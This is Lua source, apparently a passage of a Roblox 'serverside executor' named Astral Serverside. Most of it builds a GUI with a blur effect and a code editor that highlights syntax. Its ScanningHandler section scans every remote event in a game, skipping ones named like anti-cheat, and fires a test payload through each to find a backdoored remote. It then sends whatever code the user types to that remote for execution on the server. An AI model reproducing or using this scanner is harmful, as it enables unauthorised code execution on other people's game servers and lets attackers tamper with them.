ASTRAL["32"]["Text"] = [[]];
ASTRAL["32"]["Name"] = [[Button]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Arrow
ASTRAL["33"] = Instance.new("Frame", ASTRAL["31"]);
ASTRAL["33"]["Size"] = UDim2.new(0, 16, 0, 16);
ASTRAL["33"]["Name"] = [[Arrow]];
ASTRAL["33"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Arrow.Frame
ASTRAL["34"] = Instance.new("Frame", ASTRAL["33"]);
ASTRAL["34"]["BorderSizePixel"] = 0;
ASTRAL["34"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["34"]["Size"] = UDim2.new(0, 1, 0, 1);
ASTRAL["34"]["Position"] = UDim2.new(0, 10, 0, 8);
ASTRAL["34"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Arrow.Frame
ASTRAL["35"] = Instance.new("Frame", ASTRAL["33"]);
ASTRAL["35"]["BorderSizePixel"] = 0;
ASTRAL["35"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["35"]["Size"] = UDim2.new(0, 1, 0, 3);
ASTRAL["35"]["Position"] = UDim2.new(0, 9, 0, 7);
ASTRAL["35"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Arrow.Frame
ASTRAL["36"] = Instance.new("Frame", ASTRAL["33"]);
ASTRAL["36"]["BorderSizePixel"] = 0;
ASTRAL["36"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["36"]["Size"] = UDim2.new(0, 1, 0, 5);
ASTRAL["36"]["Position"] = UDim2.new(0, 8, 0, 6);
ASTRAL["36"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Rght.Arrow.Frame
ASTRAL["37"] = Instance.new("Frame", ASTRAL["33"]);
ASTRAL["37"]["BorderSizePixel"] = 0;
ASTRAL["37"]["BackgroundColor3"] = Color3.fromRGB(205, 205, 205);
ASTRAL["37"]["Size"] = UDim2.new(0, 1, 0, 7);
ASTRAL["37"]["Position"] = UDim2.new(0, 7, 0, 5);
ASTRAL["37"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Ground
ASTRAL["38"] = Instance.new("Frame", ASTRAL["10"]);
ASTRAL["38"]["Visible"] = false;
ASTRAL["38"]["ZIndex"] = 2;
ASTRAL["38"]["BorderSizePixel"] = 0;
ASTRAL["38"]["BackgroundColor3"] = Color3.fromRGB(69, 69, 69);
ASTRAL["38"]["Size"] = UDim2.new(0, 17, 0, 17);
ASTRAL["38"]["Position"] = UDim2.new(1, -17, 1, -17);
ASTRAL["38"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["38"]["Name"] = [[Ground]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Y_Bar
ASTRAL["39"] = Instance.new("Frame", ASTRAL["10"]);
ASTRAL["39"]["Visible"] = false;
ASTRAL["39"]["ZIndex"] = 2;
ASTRAL["39"]["BorderSizePixel"] = 0;
ASTRAL["39"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
ASTRAL["39"]["Size"] = UDim2.new(0, 17, 1, -17);
ASTRAL["39"]["Position"] = UDim2.new(1, -17, 0, 0);
ASTRAL["39"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["39"]["Name"] = [[Y_Bar]];
ASTRAL["39"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.X_Bar
ASTRAL["3a"] = Instance.new("Frame", ASTRAL["10"]);
ASTRAL["3a"]["Visible"] = false;
ASTRAL["3a"]["ZIndex"] = 2;
ASTRAL["3a"]["BorderSizePixel"] = 0;
ASTRAL["3a"]["BackgroundColor3"] = Color3.fromRGB(91, 91, 91);
ASTRAL["3a"]["Size"] = UDim2.new(1, -17, 0, 17);
ASTRAL["3a"]["Position"] = UDim2.new(0, 0, 1, -17);
ASTRAL["3a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["3a"]["Name"] = [[X_Bar]];
ASTRAL["3a"]["BackgroundTransparency"] = 1;


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Border
ASTRAL["3b"] = Instance.new("UIStroke", ASTRAL["10"]);
ASTRAL["3b"]["Name"] = [[Border]];
ASTRAL["3b"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Border.Rainbow
ASTRAL["3c"] = Instance.new("UIGradient", ASTRAL["3b"]);
ASTRAL["3c"]["Name"] = [[Rainbow]];
ASTRAL["3c"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.170, Color3.fromRGB(255, 166, 0)),ColorSequenceKeypoint.new(0.330, Color3.fromRGB(255, 255, 0)),ColorSequenceKeypoint.new(0.500, Color3.fromRGB(0, 255, 0)),ColorSequenceKeypoint.new(0.670, Color3.fromRGB(0, 0, 255)),ColorSequenceKeypoint.new(0.830, Color3.fromRGB(76, 0, 131)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(239, 131, 239))};


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Border.Rainbow.Rotation
ASTRAL["3d"] = Instance.new("LocalScript", ASTRAL["3c"]);
ASTRAL["3d"]["Name"] = [[Rotation]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Corner
ASTRAL["3e"] = Instance.new("UICorner", ASTRAL["10"]);
ASTRAL["3e"]["Name"] = [[Corner]];
ASTRAL["3e"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Title
ASTRAL["3f"] = Instance.new("TextLabel", ASTRAL["e"]);
ASTRAL["3f"]["TextWrapped"] = true;
ASTRAL["3f"]["TextStrokeTransparency"] = 0;
ASTRAL["3f"]["BorderSizePixel"] = 0;
ASTRAL["3f"]["TextSize"] = 14;
ASTRAL["3f"]["TextScaled"] = true;
ASTRAL["3f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["3f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
ASTRAL["3f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["3f"]["BackgroundTransparency"] = 1;
ASTRAL["3f"]["Size"] = UDim2.new(1, 0, 0, 32);
ASTRAL["3f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["3f"]["Text"] = [[Astral Serverside]];
ASTRAL["3f"]["Name"] = [[Title]];
ASTRAL["3f"]["Position"] = UDim2.new(0, 0, 0, 10);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute
ASTRAL["40"] = Instance.new("TextButton", ASTRAL["e"]);
ASTRAL["40"]["TextStrokeTransparency"] = 0;
ASTRAL["40"]["BorderSizePixel"] = 0;
ASTRAL["40"]["TextSize"] = 24;
ASTRAL["40"]["AutoButtonColor"] = false;
ASTRAL["40"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["40"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
ASTRAL["40"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
ASTRAL["40"]["AnchorPoint"] = Vector2.new(0.5, 0);
ASTRAL["40"]["BackgroundTransparency"] = 1;
ASTRAL["40"]["Size"] = UDim2.new(1, -50, 0, 30);
ASTRAL["40"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
ASTRAL["40"]["Text"] = [[Execute]];
ASTRAL["40"]["Name"] = [[Execute]];
ASTRAL["40"]["Position"] = UDim2.new(0.5, 0, 0, 235);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute.Border
ASTRAL["41"] = Instance.new("UIStroke", ASTRAL["40"]);
ASTRAL["41"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
ASTRAL["41"]["Name"] = [[Border]];
ASTRAL["41"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute.Border.Rainbow
ASTRAL["42"] = Instance.new("UIGradient", ASTRAL["41"]);
ASTRAL["42"]["Name"] = [[Rainbow]];
ASTRAL["42"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.170, Color3.fromRGB(255, 166, 0)),ColorSequenceKeypoint.new(0.330, Color3.fromRGB(255, 255, 0)),ColorSequenceKeypoint.new(0.500, Color3.fromRGB(0, 255, 0)),ColorSequenceKeypoint.new(0.670, Color3.fromRGB(0, 0, 255)),ColorSequenceKeypoint.new(0.830, Color3.fromRGB(76, 0, 131)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(239, 131, 239))};


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute.Border.Rainbow.Rotation
ASTRAL["43"] = Instance.new("LocalScript", ASTRAL["42"]);
ASTRAL["43"]["Name"] = [[Rotation]];


-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.Execute.Corner
ASTRAL["44"] = Instance.new("UICorner", ASTRAL["40"]);
ASTRAL["44"]["Name"] = [[Corner]];
ASTRAL["44"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Astral Serverside.MainFrame.Border.Rainbow.Rotation
local function C_6()
local script = ASTRAL["6"];
	while true do
		script.Parent.Rotation = script.Parent.Rotation + 4
		wait()
		if script.Parent.Rotation == 360 or script.Parent.Rotation > 360 then
			script.Parent.Rotation = 0
		end
	end
end;
task.spawn(C_6);
-- StarterGui.Astral Serverside.MainFrame.Blur
local function C_7()
local script = ASTRAL["7"];
	--# This was NOT created by me, this was created by @ImSnox (thanks)
	
	if script.Parent.Parent.Enabled ~= true then return end
	
	local Lighting          = game:GetService("Lighting")
	local camera			= workspace.CurrentCamera
	
	local BLUR_SIZE         = Vector2.new(0, 0)
	local PART_SIZE         = 0.01
	local PART_TRANSPARENCY = 1 - 1e-7
	local START_INTENSITY	= 0.25
	
	script.Parent:SetAttribute("BlurIntensity", START_INTENSITY)
	
	local BLUR_OBJ          = Instance.new("DepthOfFieldEffect")
	BLUR_OBJ.FarIntensity   = 0
	BLUR_OBJ.NearIntensity  = script.Parent:GetAttribute("BlurIntensity")
	BLUR_OBJ.FocusDistance  = 0.25
	BLUR_OBJ.InFocusRadius  = 0
	BLUR_OBJ.Parent         = Lighting
	
	local PartsList         = {}
	local BlursList         = {}
	local BlurObjects       = {}
	local BlurredGui        = {}
	
	BlurredGui.__index      = BlurredGui
	
	function rayPlaneIntersect(planePos, planeNormal, rayOrigin, rayDirection)
		local n = planeNormal
		local d = rayDirection
		local v = rayOrigin - planePos
	
		local num = n.x*v.x + n.y*v.y + n.z*v.z
		local den = n.x*d.x + n.y*d.y + n.z*d.z
		local a = -num / den
	
		return rayOrigin + a * rayDirection, a
	end
	
	function rebuildPartsList()
		PartsList = {}
		BlursList = {}
		for blurObj, part in pairs(BlurObjects) do
			table.insert(PartsList, part)
			table.insert(BlursList, blurObj)
		end
	end
	
	function BlurredGui.new(frame, shape)
		local blurPart        = Instance.new("Part")
		blurPart.Size         = Vector3.new(1, 1, 1) * 0.01
		blurPart.Anchored     = true
		blurPart.CanCollide   = false
		blurPart.CanTouch     = false
		blurPart.Material     = Enum.Material.Glass
		blurPart.Transparency = PART_TRANSPARENCY
		blurPart.Parent       = workspace.CurrentCamera
	
		local mesh
		if (shape == "Rectangle") then
			mesh        = Instance.new("BlockMesh")
			mesh.Parent = blurPart
		elseif (shape == "Oval") then
			mesh          = Instance.new("SpecialMesh")
			mesh.MeshType = Enum.MeshType.Sphere
			mesh.Parent   = blurPart
		end
		
		local ignoreInset = false
		local currentObj  = frame
		
		while true do
			currentObj = currentObj.Parent
	
			if (currentObj and currentObj:IsA("ScreenGui")) then
				ignoreInset = currentObj.IgnoreGuiInset
				break
			elseif (currentObj == nil) then
				break
			end
		end
	
		local new = setmetatable({
			Frame          = frame;
			Part           = blurPart;
			Mesh           = mesh;
			IgnoreGuiInset = ignoreInset;
		}, BlurredGui)
	
		BlurObjects[new] = blurPart
		rebuildPartsList()
	
		game:GetService("RunService"):BindToRenderStep("...", Enum.RenderPriority.Camera.Value + 1, function()
			blurPart.CFrame = camera.CFrame * CFrame.new(0,0,0)
			BlurredGui.updateAll()
		end)
		return new
	end
	
	function updateGui(blurObj)
		if (not blurObj.Frame.Visible) then
			blurObj.Part.Transparency = 1
			return
		end
		
		local camera = workspace.CurrentCamera
		local frame  = blurObj.Frame
		local part   = blurObj.Part
		local mesh   = blurObj.Mesh
		
		part.Transparency = PART_TRANSPARENCY
		
		local corner0 = frame.AbsolutePosition + BLUR_SIZE
		local corner1 = corner0 + frame.AbsoluteSize - BLUR_SIZE*2
		local ray0, ray1
	
		if (blurObj.IgnoreGuiInset) then
			ray0 = camera:ViewportPointToRay(corner0.X, corner0.Y, 1)
			ray1 = camera:ViewportPointToRay(corner1.X, corner1.Y, 1)
		else
			ray0 = camera:ScreenPointToRay(corner0.X, corner0.Y, 1)
			ray1 = camera:ScreenPointToRay(corner1.X, corner1.Y, 1)
		end
	
		local planeOrigin = camera.CFrame.Position + camera.CFrame.LookVector * (0.05 - camera.NearPlaneZ)
		local planeNormal = camera.CFrame.LookVector
		local pos0 = rayPlaneIntersect(planeOrigin, planeNormal, ray0.Origin, ray0.Direction)
		local pos1 = rayPlaneIntersect(planeOrigin, planeNormal, ray1.Origin, ray1.Direction)
	
		local pos0 = camera.CFrame:PointToObjectSpace(pos0)
		local pos1 = camera.CFrame:PointToObjectSpace(pos1)
	
		local size   = pos1 - pos0
		local center = (pos0 + pos1)/2
	
		mesh.Offset = center
		mesh.Scale  = size / PART_SIZE
	end
	
	function BlurredGui.updateAll()
		BLUR_OBJ.NearIntensity = tonumber(script.Parent:GetAttribute("BlurIntensity"))
		
		for i = 1, #BlursList do
			updateGui(BlursList[i])
		end
	
		local cframes = table.create(#BlursList, workspace.CurrentCamera.CFrame)
		workspace:BulkMoveTo(PartsList, cframes, Enum.BulkMoveMode.FireCFrameChanged)
	
		BLUR_OBJ.FocusDistance = 0.25 - camera.NearPlaneZ
	end
	
	function BlurredGui:Destroy()
		self.Part:Destroy()
		BlurObjects[self] = nil
		rebuildPartsList()
	end
	
	BlurredGui.new(script.Parent, "Rectangle")
	
	BlurredGui.updateAll()
	return BlurredGui
end;
task.spawn(C_7);
-- StarterGui.Astral Serverside.MainFrame.Drag
local function C_8()
local script = ASTRAL["8"];
	local dragging, dragstart, startpos
	script.Parent.InputBegan:Connect(function(input)
		if input.UserInputType.Name == "MouseButton1" or input.UserInputType.Name == "Touch" then
			dragging, dragstart, startpos = true, input.Position, script.Parent.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then dragging = false end
			end)
		end
	end)
	game:GetService("UserInputService").InputChanged:Connect(function(input)
		if dragging and (input.UserInputType.Name == "MouseMovement" or input.UserInputType.Name == "Touch") then
			local delta = input.Position - dragstart
			script.Parent.Position = UDim2.new(startpos.X.Scale, startpos.X.Offset + delta.X, startpos.Y.Scale, startpos.Y.Offset + delta.Y)
		end
	end)
end;
task.spawn(C_8);
-- StarterGui.Astral Serverside.MainFrame.ScanningHandler
local function C_d()
local script = ASTRAL["d"];
	--= Info =--
	local mainframe = script.Parent
	local scanningframe = mainframe:WaitForChild("ScanningFrame",3)
	local executionframe = mainframe:WaitForChild("ExecutionFrame",3)
	
	local blacklistedstrings = {"CheatDetected", "ExploitDetected","MouseLock","MouseLoc"}
	local vulnremote: RemoteEvent | RemoteFunction = nil
	local backdoored: boolean = false
	
	--= Setup =--
	scanningframe.Visible = true
	scanningframe.Position = UDim2.new(0,0,0,0)
	executionframe.Visible = false
	executionframe.Position = UDim2.new(-1,0,0,0)
	
	--= Functions =--
	local function notify(desc, duration)
		pcall(function()
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Astral Serverside",
				Text = tostring(desc),
				Duration = duration or 3
			})
			local sound = Instance.new("Sound", workspace)
			sound.SoundId = "rbxassetid://17582299860"
			sound.Volume = 1
			sound.PlayOnRemove = true
			sound:Destroy()
		end)
	end
	
	local function fire(rem,code)
		if not rem then return end
		pcall(function()
			if rem:IsA("RemoteEvent") then
				rem:FireServer(code)
			elseif rem:IsA("RemoteFunction") then
				rem:InvokeServer(code)
			end
		end)
	end
	
	local function checkremote(remote: RemoteEvent | RemoteFunction)
		for _, str in ipairs(blacklistedstrings) do
			if string.find(remote.Name:lower(), str:lower()) then
				return true
			end
		end
		if remote:FindFirstChild("__FUNCTION") or remote.Name == "__FUNCTION" then
			return true
		end
		if remote.Parent.Parent then
			if remote.Parent.Parent.Name == "HDAdminClient" and remote.Parent.Name == "Signals" then
				return true
			end
			if remote.Parent.Name == "RobloxReplicatedStorage" 
				or remote.Parent.Name == "DefaultChatSystemChatEvents" then
				return true
			end
		end
		return false
	end
	
	--= Pre-scanning Variables =--
	local testpartname: string = "starlightreborn_"..tostring(math.random(10000,99999))
	local payload = [[Instance.new("FluidForceSensor", game:GetService("SoundService")).Name = "]]..testpartname..[["]]
	
	--= Scanning =--
	local timer: number = 0
	coroutine.wrap(function()
		repeat
			timer += 0.01
			task.wait(0.01)
		until backdoored
	end)()
	
	local function checkpayload(remote: RemoteEvent | RemoteFunction)
		fire(remote,payload)
		for i = 1,32 do
			if game:GetService("SoundService"):FindFirstChild(testpartname) then
				return true
			end
			task.wait(0.01)
		end
		return false
	end
	
	for _, remote: RemoteEvent | RemoteFunction in ipairs(game:GetDescendants()) do
		if remote.Parent == nil then return end
	
		if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
			if checkremote(remote) then
				continue
			else
				notify("Testing: "..remote.Name)
				if checkpayload(remote) then
					backdoored = true
					vulnremote = remote
					fire(vulnremote,[[game:GetService("SoundService"):FindFirstChild("]]..testpartname..[["):Destroy()]])
					break
				end
			end
		end
	end
	
	if backdoored and vulnremote then
		notify("Found backdoor: "..vulnremote.Name.."\nTime took: "..tostring(timer))
		scanningframe:FindFirstChild("Description").Text = "Found backdoor: "..vulnremote.Name.."\nTime took: "..tostring(timer).."\nLoading execution panel..."
		coroutine.wrap(function()
			task.wait(1)
			executionframe.Visible = true
			scanningframe:TweenPosition(UDim2.new(1,0,0,0),"In","Back",1,false)
			executionframe:TweenPosition(UDim2.new(0,0,0,0),"In","Back",1,false)
			wait(1)
			scanningframe.Visible = false
		end)()
	else
		notify("No backdoors found! \n Exiting script safely...")
		scanningframe:FindFirstChild("Description").Text = "No backdoors found! \n Exiting script safely..."
		task.wait(0.5)
		mainframe.Parent:Destroy()
		return
	end
	
	--= Button Function(s) =--
	executionframe.Execute.MouseButton1Click:Connect(function()
		if not backdoored then return end
		local code = executionframe.FastColoredTextbox.Scroll.TextBox.Text
		fire(vulnremote,code)
	end)
end;
task.spawn(C_d);
-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Handler
local function C_1b()
local script = ASTRAL["1b"];
	--# FastColoredTextBox v3 by: C:\Drive
	
	local fctbelements = {
		scroll = script.Parent.Scroll,
		textbox = script.Parent.Scroll.TextBox,
		cursor = script.Parent.Scroll.Cursor,
		selector = script.Parent.Scroll.LineSelector,
		lines = script.Parent.Scroll.LinesFrame,
		linetemp = script.Parent.Scroll.LinesFrame.TextLabelTemplate,
		highlighting = script.Parent.Scroll.Highlighting,
		measurer = script.Parent.Scroll.TextMeasurer,
		linesvalue = script.Parent.Scroll.LinesValue,
	}
	
	--# Automatic Scrolling (1/7)
	local scrollingframe = fctbelements.scroll
	local textbox = fctbelements.textbox
	local textservice = game:GetService("TextService")
	
	local function updatecanvassize()
		local textsize = textservice:GetTextSize(textbox.Text, textbox.TextSize, textbox.Font, Vector2.new(math.huge, math.huge))
		scrollingframe.CanvasSize = UDim2.new(0, textsize.X + 20, 0, textsize.Y)
	end
	
	--textbox:GetPropertyChangedSignal("Text"):Connect(updatecanvassize) --- MOVED THIS CODE TO LINE 257 OR SOMEWHERE NEAR THAT
	updatecanvassize()
	
	--# Line Checker (2/7)
	local textbox = fctbelements.textbox
	local linesvalue = fctbelements.linesvalue
	
	local function countlines(text)
		return select(2, text:gsub("\n", "\n")) + 1
	end
	
	local lastlinecount = countlines(textbox.Text)
	
	textbox:GetPropertyChangedSignal("Text"):Connect(function()
		local currentlinecount = countlines(textbox.Text)
		if currentlinecount ~= lastlinecount then
			linesvalue.Value += currentlinecount - lastlinecount
			lastlinecount = currentlinecount
		end
	end)
	
	--# Lines (3/7)
	local scrollingframe = fctbelements.scroll
	local frame = fctbelements.lines
	local template = fctbelements.linetemp
	local linesvalue = fctbelements.linesvalue
	
	local clones = {}
	local currentlinecount = 1
	
	linesvalue:GetPropertyChangedSignal("Value"):Connect(function()
		local newlinecount = linesvalue.Value
		if newlinecount > currentlinecount then
			for _ = 1, newlinecount - currentlinecount do
				local clone = template:Clone()
				clone.Visible = true
				clone.Text = tostring(#clones + 2)
				clone.Parent = frame
				table.insert(clones, clone)
			end
		elseif newlinecount < currentlinecount then
			for _ = 1, currentlinecount - newlinecount do
				local lastclone = table.remove(clones)
				if lastclone then lastclone:Destroy() end
			end
		end
		currentlinecount = newlinecount
	end)
	
	--# Cursor (4/7)
	local fasttextbox = fctbelements.scroll
	local textbox = fasttextbox:WaitForChild("TextBox")
	local cursorframe = fasttextbox:WaitForChild("Cursor")
	local measurer = fasttextbox:WaitForChild("TextMeasurer")
	local blinkinterval = 0.5
	local lineheight = textbox.TextSize
	
	cursorframe.Size = UDim2.new(0, 1, 0, lineheight)
	cursorframe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	
	local function updatecursor()
		local cursorpos = textbox.CursorPosition
		if cursorpos <= 0 then
			cursorframe.Visible = false
			return
		end
		local textbeforecursor = textbox.Text:sub(1, cursorpos - 1)
		local linenumber = select(2, textbeforecursor:gsub("\n", "\n")) + 1
		local currentlinetext = textbeforecursor:match(".*()\n") and textbeforecursor:sub(textbeforecursor:match(".*()\n") + 1) or textbeforecursor
	
		measurer.Text = currentlinetext
		cursorframe.Position = UDim2.new(0, measurer.TextBounds.X + 17, 0, (linenumber - 1) * lineheight)
		cursorframe.Visible = true
	end
	
	local function blink()
		while true do
			cursorframe.Visible = not cursorframe.Visible
			wait(blinkinterval)
		end
	end
	
	textbox:GetPropertyChangedSignal("CursorPosition"):Connect(updatecursor)
	textbox:GetPropertyChangedSignal("Text"):Connect(updatecursor)
	spawn(blink)
	updatecursor()
	
	--# Selector (5/7)
	local fasttextbox = fctbelements.scroll
	local textbox = fasttextbox:WaitForChild("TextBox")
	local selector = fasttextbox:WaitForChild("LineSelector")
	local lineheight = textbox.TextSize
	selector.BackgroundTransparency = 0.85
	
	local tweenservice = game:GetService("TweenService")
	local tweeninfo = TweenInfo.new(0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	
	local function updatelineselector()
		local cursor = textbox.CursorPosition
		if cursor <= 0 then
			selector.Visible = false
			return
		end
		local linenumber = select(2, textbox.Text:sub(1, cursor):gsub("\n", "\n")) + 1
		tweenservice:Create(selector, tweeninfo, {
			Position = UDim2.new(0, 17, 0, (linenumber - 1) * lineheight),
			Size = UDim2.new(1, 0, 0, lineheight),
		}):Play()
		selector.Visible = true
	end
	
	textbox:GetPropertyChangedSignal("CursorPosition"):Connect(updatelineselector)
	textbox:GetPropertyChangedSignal("Text"):Connect(updatelineselector)
	updatelineselector()
	
	--# Syntax Highlighting (6/7)
	local scrollingframe = fctbelements.scroll
	local textbox = scrollingframe:WaitForChild("TextBox")
	local highlightlabel = scrollingframe:WaitForChild("Highlighting")
	
	local keywords = {
		["and"] = "keyword", ["break"] = "keyword", ["do"] = "keyword",
		["else"] = "keyword", ["elseif"] = "keyword", ["end"] = "keyword",
		["false"] = "keyword", ["for"] = "keyword", ["function"] = "keyword",
		["if"] = "keyword", ["in"] = "keyword", ["local"] = "keyword",
		["nil"] = "keyword", ["not"] = "keyword", ["or"] = "keyword",
		["repeat"] = "keyword", ["return"] = "keyword", ["then"] = "keyword",
		["true"] = "keyword", ["until"] = "keyword", ["while"] = "keyword",
		["require"] = "function", ["goto"] = "keyword", ["self"] = "keyword",
		["print"] = "function", ["pairs"] = "function", ["ipairs"] = "function",
		["next"] = "function", ["tonumber"] = "function", ["tostring"] = "function",
		["type"] = "function", ["pcall"] = "function", ["xpcall"] = "function",
		["coroutine"] = "global", ["table"] = "global", ["string"] = "global",
		["math"] = "global", ["os"] = "global",
		["assert"] = "function", ["error"] = "function", ["rawget"] = "function",
		["rawset"] = "function",
		["game"] = "global", ["workspace"] = "global", ["script"] = "global",
		["Instance"] = "type", ["Vector3"] = "type", ["CFrame"] = "type",
		["Color3"] = "type", ["UDim2"] = "type", ["Enum"] = "type",
		["wait"] = "function", ["delay"] = "function", ["spawn"] = "function",
		["tick"] = "function", ["time"] = "function",
		["Vector2"] = "type", ["BrickColor"] = "type", ["Region3"] = "type",
		["Ray"] = "type", ["task"] = "global", ["RunService"] = "global",
		["UserInputService"] = "global",
	}
	
	local colormap = {
		keyword   = Color3.fromRGB(248, 109, 124),
		["function"] = Color3.fromRGB(132, 214, 247),
		["global"]   = Color3.fromRGB(132, 214, 247),
		["type"]     = Color3.fromRGB(132, 214, 247),
		string    = Color3.fromRGB(173, 241, 149),
		comment   = Color3.fromRGB(145, 145, 145),
		number    = Color3.fromRGB(255, 198, 0),
		operator  = Color3.fromRGB(200, 200, 200),
	}
	
	local function rgb(c)
		return math.floor(c.R * 255), math.floor(c.G * 255), math.floor(c.B * 255)
	end
	
	local function colored(text, kind)
		local c = colormap[kind]
		if not c then return text end
		local r,g,b = rgb(c)
		return `<font color="rgb({r},{g},{b})">{text}</font>`
	end
	
	local function highlight(code)
		local result = ""
		local i = 1
		while i <= #code do
			if code:sub(i, i+1) == "--" then
				local comment = code:sub(i):match("^%-%-[^\n]*")
				result ..= colored(comment, "comment")
				i += #comment
			elseif code:sub(i, i) == '"' or code:sub(i, i) == "'" then
				local quote = code:sub(i, i)
				local s, e = code:find(quote..".-"..quote, i)
				local str = s and code:sub(s, e) or quote
				result ..= colored(str, "string")
				i = s and e + 1 or i + 1
			elseif code:sub(i):match("^%d") then
				local num = code:sub(i):match("^%d+%.?%d*")
				result ..= colored(num, "number")
				i += #num
			elseif code:sub(i):match("^%a") then
				local word = code:sub(i):match("^[%a_][%w_]*")
				local kind = keywords[word]
				if kind then
					result ..= colored(word, kind)
				else
					result ..= word
				end
				i += #word
			elseif code:sub(i):match("^[%p]") then
				result ..= colored(code:sub(i,i), "operator")
				i += 1
			else
				result ..= code:sub(i, i)
				i += 1
			end
		end
		return result
	end
	
	local function sync()
		highlightlabel.Text = highlight(textbox.Text)
		highlightlabel.Size = textbox.Size
		highlightlabel.Position = textbox.Position
	end
	
	textbox:GetPropertyChangedSignal("Text"):Connect(sync)
	textbox:GetPropertyChangedSignal("CursorPosition"):Connect(sync)
	textbox:GetPropertyChangedSignal("Size"):Connect(sync)
	sync()
	
	--# Scrollbar Buttons (7/7)
	local ground = script.Parent.Ground
	
	local buttons = {
		y = {
			top = script.Parent.Y_Top,
			btm = script.Parent.Y_Btm,
		},
		x = {
			lft = script.Parent.X_Lft,
			rght = script.Parent.X_Rght,
		}
	}
	
	local bars = {
		y = script.Parent.Y_Bar,
		x = script.Parent.X_Bar,
	}
	
	buttons.y.top.Visible = false
	buttons.y.btm.Visible = false
	buttons.x.rght.Visible = false
	buttons.x.lft.Visible = false
	ground.Visible = false
	
	fctbelements.textbox:GetPropertyChangedSignal("Text"):Connect(function()
		updatecanvassize()
		if fctbelements.scroll.CanvasSize.Y.Offset > (fctbelements.scroll.AbsoluteSize.Y - 16) then
			buttons.y.top.Visible = true
			buttons.y.btm.Visible = true
			--bars.y.Visible = true
		else
			buttons.y.top.Visible = false
			buttons.y.btm.Visible = false
			--bars.y.Visible = false
		end
		
		if fctbelements.scroll.CanvasSize.X.Offset > fctbelements.scroll.AbsoluteSize.X then
			buttons.x.lft.Visible = true
			buttons.x.rght.Visible = true
			--bars.x.Visible = true
		else
			buttons.x.lft.Visible = false
			buttons.x.rght.Visible = false
			--bars.x.Visible = false
		end
		
		if fctbelements.scroll.CanvasSize.Y.Offset > (fctbelements.scroll.AbsoluteSize.Y - 16) and fctbelements.scroll.CanvasSize.X.Offset > fctbelements.scroll.AbsoluteSize.X then
			buttons.y.btm.Position = UDim2.new(1, -17, 1, -34)
			buttons.x.rght.Position = UDim2.new(1, -34, 1, -17)
			ground.Visible = true
		else
			buttons.y.btm.Position = UDim2.new(1, -17, 1, -17)
			buttons.x.rght.Position = UDim2.new(1, -18, 1, -17)
			ground.Visible = false
		end
	end)
end;
task.spawn(C_1b);
-- StarterGui.Astral Serverside.MainFrame.ExecutionFrame.FastColoredTextbox.Border.Rainbow.Rotation
local function C_3d()
local script = ASTRAL["3d"];
	while true do
		script.Parent.Rotation = script.Parent.Rotation + 4
		wait()
		if script.Parent.Rotation == 360 or script.Parent.Rotation > 360 then
			script.Parent.Rotation = 0
		end
	end
end;
task.spawn(C_3d);
